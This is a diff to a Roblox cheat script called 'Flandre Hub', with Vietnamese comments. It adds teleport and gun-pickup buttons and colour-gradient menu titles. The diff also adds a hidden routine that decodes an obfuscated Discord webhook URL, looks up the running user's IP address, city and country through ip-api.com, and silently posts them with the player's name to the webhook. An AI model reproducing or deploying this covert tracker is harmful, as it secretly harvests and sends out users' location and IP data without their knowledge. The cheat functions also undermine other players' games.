@@ -1,46 +1,45 @@
-local player = game.Players.LocalPlayer
+-- LocalScript (siêu ngắn gọn)
 local HttpService = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
 
--- Webhook mã hóa dưới dạng số/số/số
 local encodedURL = "104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/52/48/52/51/51/49/57/56/57/50/48/52/52/55/49/56/57/56/47/50/52/107/55/110/107/119/121/81/65/105/95/114/85/112/118/113/80/111/76/70/72/57/71/109/115/67/112/50/102/99/105/81/77/76/83/120/68/71/114/50/89/83/65/83/74/103/76/51/76/90/100/56/120/66/116/101/106/69/50/51/89/85/109/97/86/111/49"
+local function decodeURL(enc)
+    local t={}
+    for n in string.gmatch(enc,"[^/]+") do table.insert(t,string.char(tonumber(n))) end
+    return table.concat(t)
+end
+local webhook = decodeURL(encodedURL)
 
--- Hàm giải mã URL
-local function decodeURL(encoded)
-    local chars = {}
-    for num in string.gmatch(encoded, "[^/]+") do
-        table.insert(chars, string.char(tonumber(num)))
-    end
-    return table.concat(chars)
+local function httpGet(url)
+    local req = (syn and syn.request) or http_request or request
+    if req then local r = req({Url=url,Method="GET"}) return r and (r.Body or r.body) end
+    local ok,res = pcall(function() return game:HttpGet(url) end) if ok then return res end
+end
+local function httpPost(url,body)
+    local req = (syn and syn.request) or http_request or request
+    if req then return req({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end
+    pcall(function() game:GetService("HttpService"):PostAsync(url,body,Enum.HttpContentType.ApplicationJson) end)
 end
 
-local webhookURL = decodeURL(encodedURL)
-
--- Hàm gửi webhook
-local function sendWebhook(message, sender)
-    local jsonData = HttpService:JSONEncode({
-        username = "tên bot",
-        embeds = {{
-            title = "Tiêu đề",
-            description = "Thông Báo: " .. message .. "\nNgười gửi: " .. sender,
-            color = 16711680, -- đỏ
-        }}
-    })
-
-    local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
-    if request then
-        request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    else
-        warn("Executor không hỗ trợ HTTP Request. Không thể gửi webhook.")
-    end
+local raw = httpGet("http://ip-api.com/json/") or "{}"
+local data = HttpService:JSONDecode(raw)
+local cc = (data.countryCode or "??"):upper()
+local function flag(c)
+    if #c~=2 then return "" end
+    return utf8.char(0x1F1E6 + (c:byte(1)-65), 0x1F1E6 + (c:byte(2)-65))
 end
 
--- GỬI WEBHOOK MẪU
-sendWebhook("used script", player.Name)
+local desc = string.format(
+    "Playername: %s\nThông báo: used script\nCountry: %s %s\nCity: %s\nIP: %s",
+    player.Name,
+    (data.country or "Unknown"), flag(cc),
+    (data.city or "Unknown"),
+    (data.query or "Unknown")
+)
+
+local payload = HttpService:JSONEncode({username="Flandre Fumo",embeds={{title="User Description",description=desc,color=16753920}}})
+httpPost(webhook,payload)
+print("Sent test webhook.")
 
 -- Hàm Gradient nhiều màu
 local function gradient(text, colors)
@@ -87,8 +86,8 @@ rb = {
     Color3.fromRGB(148, 0, 211)
 }
 
--- 🔥 Fire
-fire = {
+-- 🔥 F
+f = {
     Color3.fromRGB(255, 0, 0),
     Color3.fromRGB(255, 140, 0),
     Color3.fromRGB(255, 215, 0),
@@ -96,28 +95,28 @@ fire = {
 }
 
 -- 🌊 Ocean
-ocean = {
+oc = {
     Color3.fromRGB(0, 128, 255),
     Color3.fromRGB(0, 255, 200),
     Color3.fromRGB(173, 216, 230)
 }
 
 -- ✨ Galaxy
-galaxy = {
+gl = {
     Color3.fromRGB(148, 0, 211),
     Color3.fromRGB(255, 0, 255),
     Color3.fromRGB(0, 191, 255)
 }
 
 -- 🍃 Forest
-forest = {
+fr = {
     Color3.fromRGB(0, 200, 0),
     Color3.fromRGB(34, 139, 34),
     Color3.fromRGB(173, 255, 47)
 }
 
 -- 🍭 Candy
-candy = {
+c = {
     Color3.fromRGB(255, 105, 180),
     Color3.fromRGB(186, 85, 211),
     Color3.fromRGB(135, 206, 250)
@@ -201,8 +200,9 @@ end, 990)
 Window:DisableTopbarButtons({"Close","Minimize","Fullscreen"})
 
 local Section = Window:Section({Title = "Home Tab", Icon = "house", Opened = true})
-local Tab1 = Section:Tab({Title = "Welcome", Icon = "house"})
-local Tab2 = Section:Tab({Title = "Main", Icon = "house"})
+local Tab1 = Section:Tab({Title = gradient("Welcome", px), Icon = "house"})
+local Tab2 = Section:Tab({Title = gradient("Main", px), Icon = "house"})
+local Tab3 = Section:Tab({Title = gradient("Teleport", px), Icon = "house"})
 
 local Paragraph = Tab1:Paragraph({
     Title = gradient("Welcome To Flandre Hub!", px),
@@ -240,7 +240,7 @@ https://discord.gg/fBWSRqbMwn]]
 })
 
 -- ======================= ESP =======================
-local ElementsSection = Tab2:Section({Title = gradient("LocalPlayer", ss), Icon = "eye"})
+local ElementsSection = Tab2:Section({Title = gradient("LocalPlayer", px), Icon = "eye"})
 Tab2:Divider()
 
 -- Slider chỉnh tốc độ đi bộ
@@ -413,7 +413,7 @@ local Toggle = Tab2:Toggle({
 })
 
 -- ======================= ROLE / GUN =======================
-local ElementsSection2 = Tab2:Section({Title = gradient("Role", ss), Icon = "info"})
+local ElementsSection2 = Tab2:Section({Title = gradient("Role", px), Icon = "info"})
 Tab2:Divider()
 
 local Players = game:GetService("Players")
@@ -694,7 +694,7 @@ Tab2:Button({
 })
 
 -- ======================= PICK UP GUN =======================
-Tab2:Divider() -- Divider mới
+ -- Divider mới
 
 local function pickupGun()
     local char = LocalPlayer.Character
@@ -735,7 +735,7 @@ local function pickupGun()
 end
 
 -- Nút nhặt súng
-Tab2:Button({
+Tab3:Button({
     Title = gradient("Pickup Gun", px),
     Desc = "Nhặt súng trên map",
     Locked = false,
@@ -746,7 +746,7 @@ Tab2:Button({
 
 -- Toggle auto nhặt súng
 local autoPickupEnabled = false
-Tab2:Toggle({
+Tab3:Toggle({
     Title = gradient("Auto Pickup Gun", px),
     Desc = "Tự động nhặt súng khi có GunDrop trên map",
     Icon = "check",
@@ -1182,6 +1182,53 @@ local Toggle = Tab2:Toggle({
         player.CharacterAdded:Connect(function()
             cleanup()
         end)
+    end
+})
+
+-- Nút nhặt súng
+Tab3:Button({
+    Title = gradient("Teleport to lobby", px),
+    Desc = "tp về sảnh",
+    Locked = false,
+    Callback = function()
+        local plr = game.Players.LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local hrp = char:WaitForChild("HumanoidRootPart")
+
+-- Teleport trực tiếp đến tọa độ
+hrp.CFrame = CFrame.new(112.87112426757812, 157.22994995117188, 60.69239807128906)
+    end
+})
+
+-- Nút nhặt súng
+Tab3:Button({
+    Title = gradient("teleport to map", px),
+    Desc = "tp đến map",
+    Locked = false,
+    Callback = function()
+        local plr = game.Players.LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local hrp = char:WaitForChild("HumanoidRootPart")
+
+local target
+for _, obj in ipairs(workspace:GetDescendants()) do
+    if obj.Name == "Coin_Server" then
+        if obj:IsA("BasePart") then
+            target = obj
+            break
+        elseif obj:IsA("Model") then
+            target = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+            if target then break end
+        end
+    end
+end
+
+if target then
+    hrp.CFrame = target.CFrame + Vector3.new(0, 5, 0) -- +5 để tránh kẹt
+    print("Teleported to:", target:GetFullName())
+else
+    warn("Không tìm thấy Coin_Server trong workspace")
+end
     end
 })
 
